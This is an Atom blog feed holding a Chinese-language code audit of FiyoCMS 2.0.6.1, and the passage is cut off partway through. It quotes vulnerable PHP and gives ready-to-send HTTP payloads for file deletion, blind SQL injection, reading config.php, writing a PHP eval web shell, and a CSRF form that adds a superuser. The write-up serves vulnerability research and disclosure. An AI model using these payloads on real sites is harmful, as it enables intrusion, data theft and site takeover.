<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-10-21T13:43:23.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>表哥</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>fiyocms_2.0.6.1代码审计</title>
    <link href="http://yoursite.com/2020/10/21/fiyocms_2.0.6.1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://yoursite.com/2020/10/21/fiyocms_2.0.6.1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2020-10-21T13:43:23.000Z</published>
    <updated>2020-10-21T13:43:23.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="全局分析">全局分析</h2><h2 id="漏洞分析">漏洞分析</h2><h3 id="任意文件删除">任意文件删除</h3><h4 id="位置">位置</h4><p><code>/dapur/apps/app_config/controller/backuper.php</code> 第16-30行</p><h4 id="分析">分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;type&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;database&#x27;</span>) &#123;</span><br><span class="line">@unlink(<span class="string">&quot;../../../../.backup/<span class="subst">$_POST</span>[file]&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="string">&#x27;../../../../.backup&#x27;</span>))</span><br><span class="line">mkdir(<span class="string">&#x27;../../../../.backup&#x27;</span>);</span><br><span class="line"><span class="variable">$date</span> = md5(date(<span class="string">&quot;Ymd:His&quot;</span>));</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;db-backup-<span class="subst">$date</span>&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = backup_tables(<span class="string">&quot;*&quot;</span>,<span class="string">&#x27;../../../../.backup&#x27;</span>,<span class="string">&quot;<span class="subst">$file</span>&quot;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$c</span>) &#123;</span><br><span class="line"><span class="variable">$size</span> = format_size(filesize(<span class="string">&quot;../../../../.backup/<span class="subst">$file</span>.sql&quot;</span>));</span><br><span class="line"><span class="variable">$time</span> = date(<span class="string">&quot;Y/m/d H:i:s&quot;</span>,filemtime(<span class="string">&quot;../../../../.backup/<span class="subst">$file</span>.sql&quot;</span>));</span><br><span class="line"><span class="variable">$r</span> = <span class="string">&quot;<span class="subst">$size</span> - <span class="subst">$time</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#123; \&quot;file\&quot;:\&quot;<span class="subst">$file</span>.sql\&quot; , \&quot;info\&quot;:\&quot;<span class="subst">$r</span>\&quot; &#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过POST传递的参数<code>file</code>没有经过任何处理就拼接进unlink函数进行文件删除操作</p><h4 id="复现">复现</h4><p>在网站根目录下建立<code>flag.php</code>文件<br>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;dapur&#x2F;apps&#x2F;app_config&#x2F;controller&#x2F;backuper.php HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Content-Length: 27</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;cms.cn</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;cms.cn&#x2F;dapur&#x2F;apps&#x2F;app_config&#x2F;controller&#x2F;backuper.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;m0a7osbhddgpdq575hla480914</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">type&#x3D;database&amp;file&#x3D;..&#x2F;flag.php</span><br></pre></td></tr></table></figure><p>第一次发送payload，没有.backup文件夹，会新建，第二次发送，flag.php已经成功删除</p><h3 id="SQL注入漏洞">SQL注入漏洞</h3><h4 id="位置-2">位置</h4><p><code>/system/database.php</code>第210-233行</p><h4 id="分析-2">分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$rows</span>,<span class="variable">$where</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable">$update</span> = <span class="string">&#x27;UPDATE &#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27; SET &#x27;</span>;</span><br><span class="line">      <span class="variable">$keys</span> = array_keys(<span class="variable">$rows</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$rows</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">          <span class="keyword">if</span>(is_string(<span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]]) <span class="keyword">AND</span> <span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]] !== <span class="string">&#x27;+hits&#x27;</span>)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="variable">$update</span> .= <span class="variable">$keys</span>[<span class="variable">$i</span>].<span class="string">&#x27;=&quot;&#x27;</span>.<span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]].<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]] == <span class="string">&#x27;+hits&#x27;</span>) <span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]] = <span class="variable">$keys</span>[<span class="variable">$i</span>] . <span class="string">&#x27;+&#x27;</span>. <span class="number">1</span>;</span><br><span class="line">               <span class="variable">$update</span> .= <span class="variable">$keys</span>[<span class="variable">$i</span>].<span class="string">&#x27;=&#x27;</span>.<span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]];</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// Parse to add commas</span></span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$i</span> != count(<span class="variable">$rows</span>)<span class="number">-1</span>)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="variable">$update</span> .= <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$update</span> .= <span class="string">&#x27; WHERE &#x27;</span>.<span class="variable">$where</span>;</span><br><span class="line"><span class="built_in">static</span> <span class="variable">$cons</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;connect();       </span><br><span class="line"><span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="variable">$update</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$result</span> -&gt;execute();</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>可以看到这里update语句中的where条件是通过直接拼接参数$where而成的，猜测可能通过$where参数构成sql注入，我们随便找一个带有update方法的实例，如<code>/dapur/apps/app_user/controller/status.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;stat&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;stat&#x27;</span>]==<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$db</span>-&gt;update(FDBPrefix.<span class="string">&#x27;user&#x27;</span>,<span class="keyword">array</span>(<span class="string">&quot;status&quot;</span>=&gt;<span class="string">&quot;1&quot;</span>),<span class="string">&#x27;id=&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">alert(<span class="string">&#x27;success&#x27;</span>,Status_Applied,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="复现-2">复现</h4><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;dapur&#x2F;apps&#x2F;app_user&#x2F;controller&#x2F;status.php?stat&#x3D;1&amp;id&#x3D;1%20and%20if(ascii(substr(database(),1,1))&#x3D;102,sleep(5),1) HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;m0a7osbhddgpdq575hla480914</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>成功造成延时注入，delete方法也同样存在这个问题</p><h3 id="文件读取漏洞">文件读取漏洞</h3><h4 id="位置-3">位置</h4><p><code>/dapur/apps/app_theme/libs/check_file.php</code> 第13-26行</p><h4 id="分析-3">分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$url</span>= <span class="string">&quot;<span class="subst">$_GET</span>[src]/<span class="subst">$_GET</span>[name]&quot;</span>; </span><br><span class="line"><span class="variable">$furl</span> = <span class="string">&quot;../../../<span class="subst">$url</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = strlen(<span class="string">&quot;<span class="subst">$file</span>&quot;</span>) - <span class="number">5</span>;</span><br><span class="line"><span class="variable">$content</span> = substr(<span class="string">&quot;<span class="subst">$file</span>&quot;</span>,<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = strpos(<span class="string">&quot;<span class="subst">$content</span>&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = substr(<span class="string">&quot;<span class="subst">$content</span>&quot;</span>,<span class="variable">$file</span>+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span> == <span class="string">&quot;html&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;htm&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;xhtml&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;js&quot;</span> ||</span><br><span class="line"><span class="variable">$file</span> == <span class="string">&quot;jsp&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;php&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;css&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;xml&quot;</span> ) :</span><br><span class="line"><span class="variable">$content</span> = @file_get_contents(<span class="variable">$furl</span>);</span><br><span class="line"><span class="variable">$content</span> = htmlentities(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>通过file_get_contents函数对<code>$furl</code>参数的值进行文件读取，而<code>$furl</code>参数是由GET方式传入的参数src和name拼接而成，且文件读取的对象后缀需要是指定文件后缀，<code>$file</code>的值即目标文件的后缀名。这就构成了任意文件读取漏洞</p><h4 id="复现-3">复现</h4><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;dapur&#x2F;apps&#x2F;app_theme&#x2F;libs&#x2F;check_file.php?src&#x3D;..&amp;name&#x3D;config.php HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;74cpjhhrkrssoo4e2p55jrtns7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>读取网站根目录下的config.php文件</p><h3 id="文件上传漏洞">文件上传漏洞</h3><h4 id="位置-4">位置</h4><p><code>/dapur/apps/app_theme/libs/save_file.php</code> 第23-27行</p><h4 id="分析-4">分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&quot;content&quot;</span>];</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&quot;src&quot;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="variable">$w</span> = file_put_contents(<span class="variable">$f</span>,<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure><p>没有过滤参数就拼接在file_put_contents函数中，构成文件上传漏洞</p><h4 id="复现-4">复现</h4><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;dapur&#x2F;apps&#x2F;app_theme&#x2F;libs&#x2F;save_file.php HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Content-Length: 97</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;cms.cn</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;cms.cn&#x2F;dapur&#x2F;apps&#x2F;app_theme&#x2F;libs&#x2F;save_file.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;74cpjhhrkrssoo4e2p55jrtns7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">content&#x3D;&lt;?php eval($_POST[&#39;shell&#39;]); ?&gt;&amp;src&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;shell.php</span><br></pre></td></tr></table></figure><h3 id="CSRF漏洞">CSRF漏洞</h3><h4 id="位置-5">位置</h4><p><code>/dapur/apps/app_user/sys_user.php</code> 第110-123行</p><h4 id="分析-5">分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save&#x27;</span>]) <span class="keyword">or</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;apply&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$us</span>=strlen(<span class="string">&quot;<span class="subst">$_POST</span>[user]&quot;</span>);</span><br><span class="line"><span class="variable">$ps</span>=strlen(<span class="string">&quot;<span class="subst">$_POST</span>[password]&quot;</span>);</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">preg_match(<span class="string">&#x27;/[^a-zA-Z0-9]+/&#x27;</span>, <span class="variable">$user</span>, <span class="variable">$matches</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) <span class="keyword">AND</span> </span><br><span class="line">!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>])<span class="keyword">AND</span> </span><br><span class="line">!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>])<span class="keyword">AND</span> </span><br><span class="line">!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>])<span class="keyword">AND</span> </span><br><span class="line">!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;level&#x27;</span>])<span class="keyword">AND</span> </span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$_POST</span>[<span class="string">&#x27;kpassword&#x27;</span>] <span class="keyword">AND</span> </span><br><span class="line"><span class="variable">$us</span>&gt;<span class="number">2</span> <span class="keyword">AND</span> <span class="variable">$ps</span>&gt;<span class="number">3</span> <span class="keyword">AND</span> @ereg(<span class="string">&quot;^.+@.+\\..+$&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]) <span class="keyword">AND</span> !<span class="variable">$matches</span>) &#123;</span><br><span class="line"><span class="variable">$qr</span>=<span class="variable">$db</span>-&gt;insert(FDBPrefix.<span class="string">&#x27;user&#x27;</span>,<span class="keyword">array</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;<span class="subst">$user</span>&quot;</span>,<span class="string">&quot;<span class="subst">$name</span>&quot;</span>,MD5(<span class="string">&quot;<span class="subst">$_POST</span>[password]&quot;</span>),<span class="string">&quot;<span class="subst">$_POST</span>[email]&quot;</span>,<span class="string">&quot;<span class="subst">$_POST</span>[status]&quot;</span>,<span class="string">&quot;<span class="subst">$_POST</span>[level]&quot;</span>,date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>),<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;<span class="subst">$_POST</span>[bio]&quot;</span>)); </span><br></pre></td></tr></table></figure><p>没有加入token验证，所以可以造成CSRF攻击，可以添加超级用户</p><h4 id="复现-5">复现</h4><p>抓取添加用户的包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;dapur&#x2F;?app&#x3D;user&amp;act&#x3D;add HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Content-Length: 138</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;cms.cn</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;cms.cn&#x2F;dapur&#x2F;?app&#x3D;user&amp;act&#x3D;add</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;6st43dvq664h8i9es4mlfevdi3</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">apply&#x3D;Next&amp;id&#x3D;&amp;z&#x3D;&amp;user&#x3D;test555&amp;z&#x3D;&amp;x&#x3D;&amp;password&#x3D;123456&amp;kpassword&#x3D;123456&amp;email&#x3D;test555%40qq.com&amp;level&#x3D;1&amp;name&#x3D;test555&amp;status&#x3D;1&amp;bio&#x3D;test555</span><br></pre></td></tr></table></figure><p>构造好的用于建立超级用户的网页代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://cms.cn/dapur/?app=user&amp;act=add&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;apply&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Next&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;z&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test555&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;z&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;x&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;kpassword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test555<span class="symbol">&amp;#64;</span>qq<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;level&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test555&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span 